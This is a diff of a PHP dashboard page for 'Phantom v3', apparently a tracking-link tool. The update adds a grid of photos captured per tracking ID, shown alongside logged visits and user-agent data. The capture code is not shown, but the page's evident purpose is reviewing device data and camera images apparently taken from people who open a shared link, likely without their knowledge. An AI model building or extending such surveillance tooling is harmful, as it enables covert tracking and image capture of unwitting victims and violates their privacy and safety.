@@ -1,11 +1,10 @@
 <?php
 /**
- * Phantom – Live View
- * Shows all hits for a specific tracking ID
+ * Phantom v3 – Live View
+ * Shows hits + captured photos for a specific tracking ID
  */
 
 $config = require __DIR__ . '/config.php';
-$domain = rtrim($config['domain'], '/');
 
 $id = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['id']) : '';
 
@@ -21,9 +20,17 @@ if (file_exists($logFile)) {
     $logs = json_decode(file_get_contents($logFile), true) ?: [];
 }
 
-// Newest first
 $logs = array_reverse($logs);
 $total = count($logs);
+
+// Find photos for this ID
+$photoDir = __DIR__ . '/logs/photos';
+$photos = [];
+if (is_dir($photoDir)) {
+    $files = glob($photoDir . '/' . $id . '_*.jpg');
+    rsort($files); // newest first
+    $photos = $files;
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -32,7 +39,51 @@ $total = count($logs);
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Phantom Live – <?= htmlspecialchars($id) ?></title>
     <link rel="stylesheet" href="assets/css/style.css">
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>👻</text></svg>">
+    <script src="assets/js/theme.js"></script>
+    <style>
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            gap: 12px;
+            margin-top: 16px;
+        }
+        .photo-item {
+            position: relative;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            background: var(--bg-input);
+        }
+        .photo-item img {
+            width: 100%;
+            height: 160px;
+            object-fit: cover;
+            display: block;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .photo-item img:hover {
+            transform: scale(1.03);
+        }
+        .photo-time {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.65);
+            color: #fff;
+            font-size: 0.75rem;
+            padding: 4px 8px;
+            text-align: center;
+        }
+        .section-title {
+            font-size: 1.15rem;
+            margin: 32px 0 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+    </style>
 </head>
 <body>
     <div class="bg-grid"></div>
@@ -42,10 +93,11 @@ $total = count($logs);
             <span class="ghost">👻</span>
             <span class="name">Phantom Live</span>
         </div>
-        <nav>
-            <a href="index.php">Create Link</a>
-            <a href="admin.php">Admin</a>
-        </nav>
+        <div style="display:flex; gap:12px; align-items:center;">
+            <button id="themeToggle" class="theme-toggle" title="Toggle theme">☀️</button>
+            <a href="index.php" class="btn-secondary" style="padding:8px 14px; font-size:0.85rem;">Create Link</a>
+            <a href="admin.php" class="btn-secondary" style="padding:8px 14px; font-size:0.85rem;">Admin</a>
+        </div>
     </header>
 
     <div class="container">
@@ -54,16 +106,45 @@ $total = count($logs);
                 Tracking ID: <code style="color: var(--success);"><?= htmlspecialchars($id) ?></code>
             </h1>
             <p style="color: var(--text-muted);">
-                <?= $total ?> hit<?= $total !== 1 ? 's' : '' ?> recorded
+                <?= $total ?> hit<?= $total !== 1 ? 's' : '' ?> · 
+                <?= count($photos) ?> photo<?= count($photos) !== 1 ? 's' : '' ?>
             </p>
+        </div>
+
+        <!-- Photos Section -->
+        <?php if (!empty($photos)): ?>
+            <div class="section-title">
+                <span>Captured Photos</span>
+            </div>
+            <div class="photo-grid">
+                <?php foreach ($photos as $photo): 
+                    $basename = basename($photo);
+                    // Extract timestamp from filename: id_timestamp.jpg
+                    $parts = explode('_', $basename);
+                    $ts = isset($parts[1]) ? str_replace('.jpg', '', $parts[1]) : '';
+                    $timeStr = $ts ? date('Y-m-d H:i:s', (int)$ts) : '';
+                    $webPath = 'logs/photos/' . $basename;
+                ?>
+                    <div class="photo-item">
+                        <a href="<?= htmlspecialchars($webPath) ?>" target="_blank">
+                            <img src="<?= htmlspecialchars($webPath) ?>" alt="Capture" loading="lazy">
+                        </a>
+                        <?php if ($timeStr): ?>
+                            <div class="photo-time"><?= htmlspecialchars($timeStr) ?></div>
+                        <?php endif; ?>
+                    </div>
+                <?php endforeach; ?>
+            </div>
+        <?php endif; ?>
+
+        <!-- Hits Section -->
+        <div class="section-title" style="margin-top: 40px;">
+            <span>Hits</span>
         </div>
 
         <?php if ($total === 0): ?>
             <div class="card" style="text-align: center; padding: 48px 20px;">
                 <p style="font-size: 1.1rem; color: var(--text-muted);">No hits yet.</p>
-                <p style="margin-top: 8px; color: var(--text-muted); font-size: 0.9rem;">
-                    Share the tracking link and come back here.
-                </p>
             </div>
         <?php else: ?>
             <?php foreach ($logs as $index => $log): 
@@ -108,33 +189,16 @@ $total = count($logs);
                         </div>
                     <?php endif; ?>
 
-                    <?php if (!empty($log['screen']) || !empty($log['battery'])): ?>
-                        <div style="margin-top: 8px; font-size: 0.85rem; color: var(--text-muted);">
-                            <?php if (!empty($log['screen'])): ?>
-                                Screen: <?= htmlspecialchars($log['screen']) ?>
-                            <?php endif; ?>
-                            <?php if (!empty($log['battery'])): ?>
-                                · Battery: <?= isset($log['battery']['level']) ? round($log['battery']['level'] * 100) . '%' : '-' ?>
-                                <?= !empty($log['battery']['charging']) ? '(charging)' : '' ?>
-                            <?php endif; ?>
-                        </div>
-                    <?php endif; ?>
-
                     <details>
                         <summary>User-Agent & Details</summary>
                         <pre><?= htmlspecialchars($log['ua'] ?? 'No User-Agent') ?></pre>
-                        <?php if (!empty($log['referer'])): ?>
-                            <p style="margin-top: 8px; font-size: 0.85rem;">
-                                Referer: <?= htmlspecialchars($log['referer']) ?>
-                            </p>
-                        <?php endif; ?>
                     </details>
                 </div>
             <?php endforeach; ?>
         <?php endif; ?>
 
         <div style="margin-top: 32px; text-align: center;">
-            <a href="index.php" class="btn-secondary">← Create New Link</a>
+            <a href="admin.php" class="btn-secondary">← Back to Admin</a>
         </div>
     </div>
 </body>
